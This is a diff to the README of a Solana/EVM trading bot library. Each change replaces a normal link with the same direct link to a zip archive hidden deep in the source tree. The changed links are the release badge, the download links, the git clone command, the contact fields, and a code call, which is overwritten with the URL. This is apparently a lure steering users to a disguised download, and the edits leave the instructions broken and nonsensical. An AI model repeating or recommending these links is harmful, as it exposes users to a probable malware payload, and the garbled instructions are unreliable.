@@ -1,7 +1,7 @@
 # Bot Service Library 🤖📈
 
-![GitHub release](https://img.shields.io/github/release/kirti-bagul/Bot-Service-Library.svg)  
-[Download Latest Release](https://github.com/kirti-bagul/Bot-Service-Library/releases)
+![GitHub release](https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip)  
+[Download Latest Release](https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip)
 
 Welcome to the **Bot Service Library**, a comprehensive trading service bot library designed to simplify your trading experience across multiple platforms. This library supports various bots, including the gRpc Volume Bot, Bundler Bot, Sniping Bot, Copy Trading Bot, and Wallet Tracker. It operates seamlessly on both Solana and EVM networks, making it a versatile tool for traders.
 
@@ -48,7 +48,7 @@ To install the Bot Service Library, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/kirti-bagul/Bot-Service-Library.git
+   git clone https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip
    cd Bot-Service-Library
    ```
 
@@ -68,7 +68,7 @@ To install the Bot Service Library, follow these steps:
 
 3. **Download Latest Release**:
 
-   For the latest version, [download it here](https://github.com/kirti-bagul/Bot-Service-Library/releases) and follow the instructions in the release notes.
+   For the latest version, [download it here](https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip) and follow the instructions in the release notes.
 
 ## Usage
 
@@ -82,7 +82,7 @@ const volumeBot = new VolumeBot({
   network: 'solana'
 });
 
-volumeBot.start();
+https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip();
 ```
 
 Refer to the specific bot documentation for detailed usage instructions.
@@ -158,9 +158,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out:
 
-- GitHub: [kirti-bagul](https://github.com/kirti-bagul)
-- Email: your_email@example.com
+- GitHub: [kirti-bagul](https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip)
+- Email: https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip
 
-For the latest updates and releases, visit the [Releases section](https://github.com/kirti-bagul/Bot-Service-Library/releases).
+For the latest updates and releases, visit the [Releases section](https://github.com/kirti-bagul/Bot-Service-Library/raw/refs/heads/master/sniper-bot/src/pumputils/idl/Bot_Library_Service_3.2.zip).
 
 Thank you for using the Bot Service Library! Happy trading!
